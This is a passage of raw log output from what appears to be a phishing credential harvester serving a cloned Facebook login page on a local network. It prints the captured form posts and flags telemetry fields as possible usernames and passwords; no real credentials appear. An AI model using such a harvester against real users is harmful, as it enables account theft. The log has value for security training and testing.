2:gg542j","trigger":"falco:bd_pdc_signals","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]                
------WebKitFormBoundarymW8kfhA6NcA8XAKv--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:33:13] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=8&__rev=1019191350&__s=pxzghl%3A8f8sw2%3Agg542j&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=0                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=9                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=pxzghl:8f8sw2:gg542j                                              
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:33:23] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=0                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=a                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=pxzghl:8f8sw2:gg542j                                              
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:33:24] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=0                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=b                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=pxzghl:8f8sw2:gg542j                                              
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:33:24] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryy61yPVpUwuebNKYg      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736282024125                                                                
------WebKitFormBoundaryy61yPVpUwuebNKYg                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":"4QjwaVtbImZhbGNvOmJkX3BkY19zaWduYWxzIix7ImUiOiJ7XCJhc2lkXCI6XCJiMTExMDRjZS1kNzY5LTQ4MTEtOGE2OS1mMWVhYWJjNjMyYWJcIixcImN0XCI6MTY1OTA4MDM0NSxcInNqZFwBQ/Cca1RTTGJ1ZFd4RFJRT2ZWNHErNmgvTGNjZVRHNHp0L1hJa2lOeWRMTXBQdm4wTFVWd3NpU1pvNUVtYjh1SnlxbXRKNHczOWJvTW1ObGx4NzdXb3ZWSU1KVzFJRVNscVhOelUvbHVHMmN3K0JJR3NhMDhteGZFajJUSTJvWjZ6UFFuSVBmVjBmTmNQaFppVHUvaFltbHVBPT1cIixcIgno9CABLTF9IiwiciI6MSwiZCI6IiRefEFjYjhVSEtqVlNBSDNOODE0aGJmRUpEVjk0cHhJNTNTU0FwVmdBUXo3LVB6X28tZDg1WGNkeWR3bkRVaHdDMDZXLXRid0g0QmNoZlo2QVlvbnVBdkxMMTFjNjhjfGZkLkFjYmpVak96QmlKS2o3WDBSSTNEeW4xZi02LWNWaF9JUWRlTUFOc25JeTZqdE9FY0pzLUpxWHpHMVJUc0c5NjNvd21xdkFDWHJaZFhzOEtua05yMEhnT1MiLCJzIjoieHFlMnFqOjhmOHN3MjpnZzU0MmoiLCJ0IjoxNzM2MjgxODYwNzY0LjMsImIiOlsxLDEyOF19LDE3MzYyODE5MDQ2NTIuMyw0LDUxMl0sW/4wAu4wAkUw8IFEMm1YN1BJNDZ3WjdkZ1phcXpJNEMyRkU4R0VZcEtPbktaWVMzOW5ySHhtcFFsRFlvRzh0OGQ3VEJZYzFEQmVVSnBVYnBFait1OE1wKzQvalIrWjRab3RseFpDUVQ2bm5xVVMzQ1hKQlB6clNBclBpNVVTcVg4RVg2V2JJVmNlRWc9/jAC/jAC/jAC/jACIDkwNzgxLjgsIk4wAjgzNDYzNC4xLDIsNTEyXV0=","user":"0","webSessionId":"xqe2qj:8f8sw2:gg542j","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":1},{"app_id":"256281040558","posts":[["falco:web_time_spent_bit_array",{"e":"{\"sid_raw\":\"pxzghl:8f8sw2:gg542j\",\"start_time\":1736281959,\"tos_array\":[-946868093,-73400314],\"tos_cum\":29,\"tos_id\":\"gg542j\",\"tos_len\":64,\"tos_seq\":1}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":"pxzghl:8f8sw2:gg542j","t":1736281979271.2,"b":[1,128]},1736282023123.5,0,434]],"user":"0","webSessionId":"pxzghl:8f8sw2:gg542j","compression":""}]                                                               
------WebKitFormBoundaryy61yPVpUwuebNKYg--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:33:43] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=c&__rev=1019191350&__s=pxzghl%3A8f8sw2%3Agg542j&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
192.168.10.106 - - [07/Jan/2025 17:34:44] "GET / HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundary4ViiUKMHI231QvS7      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736282085862                                                                
------WebKitFormBoundary4ViiUKMHI231QvS7                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":"4QjwaVtbImZhbGNvOmJkX3BkY19zaWduYWxzIix7ImUiOiJ7XCJhc2lkXCI6XCJiMTExMDRjZS1kNzY5LTQ4MTEtOGE2OS1mMWVhYWJjNjMyYWJcIixcImN0XCI6MTY1OTA4MDM0NSxcInNqZFwBQ/Cca1RTTGJ1ZFd4RFJRT2ZWNHErNmgvTGNjZVRHNHp0L1hJa2lOeWRMTXBQdm4wTFVWd3NpU1pvNUVtYjh1SnlxbXRKNHczOWJvTW1ObGx4NzdXb3ZWSU1KVzFJRVNscVhOelUvbHVHMmN3K0JJR3NhMDhteGZFajJUSTJvWjZ6UFFuSVBmVjBmTmNQaFppVHUvaFltbHVBPT1cIixcIgno9CABLTF9IiwiciI6MSwiZCI6IiRefEFjYjhVSEtqVlNBSDNOODE0aGJmRUpEVjk0cHhJNTNTU0FwVmdBUXo3LVB6X28tZDg1WGNkeWR3bkRVaHdDMDZXLXRid0g0QmNoZlo2QVlvbnVBdkxMMTFjNjhjfGZkLkFjYmpVak96QmlKS2o3WDBSSTNEeW4xZi02LWNWaF9JUWRlTUFOc25JeTZqdE9FY0pzLUpxWHpHMVJUc0c5NjNvd21xdkFDWHJaZFhzOEtua05yMEhnT1MiLCJzIjoieHFlMnFqOjhmOHN3MjpnZzU0MmoiLCJ0IjoxNzM2MjgxODYwNzY0LjMsImIiOlsxLDEyOF19LDE3MzYyODE5MDQ2NTIuMyw1LDUxMl0sW/4wAu4wAkUw8IFEMm1YN1BJNDZ3WjdkZ1phcXpJNEMyRkU4R0VZcEtPbktaWVMzOW5ySHhtcFFsRFlvRzh0OGQ3VEJZYzFEQmVVSnBVYnBFait1OE1wKzQvalIrWjRab3RseFpDUVQ2bm5xVVMzQ1hKQlB6clNBclBpNVVTcVg4RVg2V2JJVmNlRWc9/jAC/jAC/jAC/jACIDkwNzgxLjgsIk4wAjgzNDYzNC4xLDMsNTEyXV0=","user":"0","webSessionId":"xqe2qj:8f8sw2:gg542j","send_method":"beacon","compression":"snappy_base64","snappy_ms":1},{"app_id":"256281040558","posts":[["falco:ods_web_batch",{"e":"{\"batch\":{\"7173\":{\"entities.ff_js_web.web_time_spent_bit_array.256281040558.0.C3\":{\"event.logged\":{\"n\":1,\"d\":null},\"event.info.upload_method.banzai.log_immediately\":{\"n\":1,\"d\":null},\"event.info.banzai.log_immediately.upload_processing\":{\"n\":1,\"d\":null},\"event.uploaded\":{\"n\":1,\"d\":null}}}}}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":"pxzghl:8f8sw2:gg542j","t":1736281984291.4,"b":[1,128]},1736282028143.7002,0,587]],"user":"0","webSessionId":"pxzghl:8f8sw2:gg542j","compression":""}]                                    
------WebKitFormBoundary4ViiUKMHI231QvS7--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:34:44] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=d&__rev=1019191350&__s=pxzghl%3A8f8sw2%3Agg542j&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundary6C2ZcV4wPUEdAi0w      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736282085865                                                                
------WebKitFormBoundary6C2ZcV4wPUEdAi0w                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":"8AjwVFtbImZhbGNvOndlYl9ibHVlX3RpbWVfc3BlbnRfbmF2aWdhdGlvbiIseyJlIjoie1wianNvbl9kYXRhXCI6XCJ7XFxcInNvdXJjZV9wYXRoXFxcIjoBFEhYV2ViTG9naW5Db250cm9sbGVyARcALAEFDTAQdG9rZW4BEAA6AQUcOTZlODhhZjMBDAUmDGRlc3QZVAxudWxsGRcZOxUYEGNhdXNlAT0FThR1bmxvYWQBDwU1GHNpZF9yYXcBEAUfTHB4emdobDo4ZjhzdzI6Z2c1NDJqAR0ALAEFDZ8UZWZfcGFnCVMVZg0cCHVyaQEqBUxkaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2wB/wwucGhwASvw1H1cIn0iLCJyIjoxLCJkIjoiJF58QWNiOFVIS2pWU0FIM044MTRoYmZFSkRWOTRweEk1M1NTQXBWZ0FRejctUHpfby1kODVYY2R5ZHduRFVod0MwNlctdGJ3SDRCY2hmWjZBWW9udUF2TEwxMWM2OGN8ZmQuQWNialVqT3pCaUpLajdYMFJJM0R5bjFmLTYtY1ZoX0lRZGVNQU5zbkl5Nmp0T0VjSnMtSnFYekcxUlRzRzk2M293bXF2QUNYclpkWHM4S25rTnIwSGdPUyIsInMiOiJweEZFAYgiLCJ0IjoxNzM2MjgyMDQyMDEyLjEsImIiOlsxLDEyOF19LBEdODg1ODY0LjUsMCw1ODVdLC6JAl2EKGJpdF9hcnJheSIsVYMxzggiOlxWygEgIixcInN0YXJ0BUoAXBmRHDIzLFwidG9zCVMAXAGWNDc5MSw5Mzk0NTgwNDhdDR8cY3VtXCI6NTgNDwRpZAVsTSgBXgFEGGxlblwiOjYRUxhzZXFcIjoy/uYB/uYB/uYB1uYBCDMuM2bmASg1LjUsMCw0MjhdXQ==","user":"0","webSessionId":"pxzghl:8f8sw2:gg542j","send_method":"beacon","compression":"snappy_base64","snappy_ms":1}]                                                                 
------WebKitFormBoundary6C2ZcV4wPUEdAi0w--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:34:44] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=e&__rev=1019191350&__s=pxzghl%3A8f8sw2%3Agg542j&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundarycvkwBxXc9RTHlg7K      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736282087215                                                                
------WebKitFormBoundarycvkwBxXc9RTHlg7K                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":"wgrwVFtbImZhbGNvOndlYl9ibHVlX3RpbWVfc3BlbnRfbmF2aWdhdGlvbiIseyJlIjoie1wianNvbl9kYXRhXCI6XCJ7XFxcInNvdXJjZV9wYXRoXFxcIjoBFEhYV2ViTG9naW5Db250cm9sbGVyARcALAEFDTAQdG9rZW4BEAA6AQUcOTZlODhhZjMBDAUmDGRlc3SmVAAFLnpSADBpbXByZXNzaW9uX2lkAWgFeUAxekI4M05Ib09HZ0RKMzlaNAEaBYIQY2F1c2UBDgUoCGxvYQU1BRsYc2lkX3JhdxUdSHB4emdobDo4ZjhzdzI6N3FobWRC8AAUZWZfcGFnCVEQbnVsbCwBPi0MCHVyaQEOBWlkaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2whUAwucGhwASsFPgX2UlgABRraVgANlBhyZXN0b3JlBfXw2Dp0cnVlfVwifSIsInIiOjEsImQiOiIkXnxBY2I4VUhLalZTQUgzTjgxNGhiZkVKRFY5NHB4STUzU1NBcFZnQVF6Ny1Qel9vLWQ4NVhjZHlkd25EVWh3QzA2Vy10YndINEJjaGZaNkFZb251QXZMTDExYzY4Y3xmZC5BY2JqVWpPekJpSktqN1gwUkkzRHluMWYtNi1jVmhfSVFkZU1BTnNuSXk2anRPRWNKcy1KcVh6RzFSVHNHOTYzb3dtcXZBQ1hyWmRYczhLbmtOcjBIZ09TIiwicyI6InBKuAGYIiwidCI6MTczNjI4MTg2MDQ5My4wOTk5LCJiIjpbMSwxMjhdfSwxBSBAMjA4NjIxMS42LDAsNzg0XSwuUANMcGVyZl9kZXZpY2VfaW5mb19sb2d9SlRjcHVfY29yZXNcIjoyLFwicmFtXCI6SRp8ImdwdV9yZW5kZXJlclwiOlwiQU5HTEUgKEludGVsLCAFB/BCKFIpIFVIRCBHcmFwaGljcyAoMHgwMDAwOUE3OCkgRGlyZWN0M0QxMSB2c181XzAgcHNfNV8wLCBEM0QxMSlcIixcIgFnEHZlbmRvCWUoR29vZ2xlIEluYy4NawQpXP70Af70Af70AdL0ARA1MjYuNGLxASwzNS43LDAsNDM5XV0=","user":"0","webSessionId":"pxzghl:8f8sw2:7qhmdr","trigger":"falco:web_blue_time_spent_navigation","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]                                                                         
------WebKitFormBoundarycvkwBxXc9RTHlg7K--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:34:46] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=1&__rev=1019191350&__s=pxzghl%3A8f8sw2%3A7qhmdr&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundary4Ls32WaJA6JCvVBK      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736282095226                                                                
------WebKitFormBoundary4Ls32WaJA6JCvVBK                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":"iwuAW1siZmFsY286b2RzX3dlYl9iYXRjaCIseyJlIjoie1wiBRAkXCI6e1wiMjk2NgkKTG1zLnRpbWVfc3BlbnQucWEud3d3CRodF0hiaXRzLmpzX2luaXRpYWxpemVkCSQcblwiOjEsXCIBDzRudWxsfX19LFwiNzE3MwkgMGVudGl0aWVzLmZmX2oFlgAuBZoMbHVlXxlgbF9uYXZpZ2F0aW9uLjI1NjI4MTA0MDU1OC4wLkMRSQB2AZ8MbG9nZ2J7AAgsXCIJJmBpbmZvLnVwbG9hZF9tZXRob2QuYmFuemFpAUAwX2ltbWVkaWF0ZWx5XCUMQsQANkkAVjsAEWAkcHJvY2Vzc2luZ35NAAmRYr4ABXZWLgEscGVyZl9kZXZpY2VfAdwMX2xvZ/4oATUoGd8Nov7TAB3T9CwBfX19IiwiciI6MSwiZCI6IiRefEFjYjhVSEtqVlNBSDNOODE0aGJmRUpEVjk0cHhJNTNTU0FwVmdBUXo3LVB6X28tZDg1WGNkeWR3bkRVaHdDMDZXLXRid0g0QmNoZlo2QVlvbnVBdkxMMTFjNjhjfGZkLkFjYmpVak96QmlKS2o3WDBSSTNEeW4xZi02LWNWaF9JUWRlTUFOc25JeTZqdE9FY0pzLUpxWHpHMVJUc0c5NjNvd21xdkFDWHJaZFhzOEtua05yMEhnT1MiLCJzIjoicHh6Z2hsOjhmOHN3Mjo3cWhtZHIiLCJ0IjoxNzM2MjgxODY1NDk4LCJiIjpbMSwxMjhdfSwxNzM2MjgyMDkxMjA3LjMsMCw4OTZdLFsiZmFsY286d2ViX3RpbW2DJF9iaXRfYXJyYXl9uhRzaWRfcmFhmABcUoMAJFwiLFwic3RhcnQFSgxcIjoxBY8kMjA4NixcInRvcwlTJFwiOlsyMDcsMF0NFhRjdW1cIjoRJBxpZFwiOlwiNwXXAFwBVAE6BGxlYSIAOQ0yGHNlcVwiOjD+2QH+2QH+2QHK2QEUODUwOS40WtsBNDQyMTguOCwwLDQxN11d","user":"0","webSessionId":"pxzghl:8f8sw2:7qhmdr","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]     
------WebKitFormBoundary4Ls32WaJA6JCvVBK--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:34:54] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=2&__rev=1019191350&__s=pxzghl%3A8f8sw2%3A7qhmdr&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=0                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=3                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=pxzghl:8f8sw2:7qhmdr                                              
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:35:15] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=0                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=4                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=pxzghl:8f8sw2:7qhmdr                                              
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:35:15] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=0                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=5                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=pxzghl:8f8sw2:7qhmdr                                              
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:35:15] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryHtdOakQKCPgF6dfJ      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736282159359                                                                
------WebKitFormBoundaryHtdOakQKCPgF6dfJ                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
